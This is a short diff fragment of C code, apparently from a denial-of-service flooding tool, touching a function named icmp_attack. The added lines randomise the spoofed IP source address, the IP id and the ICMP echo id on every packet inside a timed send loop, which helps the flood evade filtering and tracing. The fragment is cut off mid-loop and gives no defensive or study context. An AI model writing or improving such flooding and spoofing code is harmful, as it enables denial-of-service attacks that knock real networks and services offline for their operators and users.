@@ -61,8 +61,12 @@ void* icmp_attack(void* arg) {
 
     time_t end_time = time(NULL) + params->duration;
     uint32_t packets_sent = 0;
-    
+
     while (params->active && time(NULL) < end_time) {
+        iph->saddr = htonl((uint32_t)(rand() << 16) | (rand() & 0xFFFF));
+        iph->id = htons((uint16_t)(rand() & 0xFFFF));
+
+        icmph->un.echo.id = htons(rand() & 0xFFFF);
         icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
         icmph->checksum = 0;
         
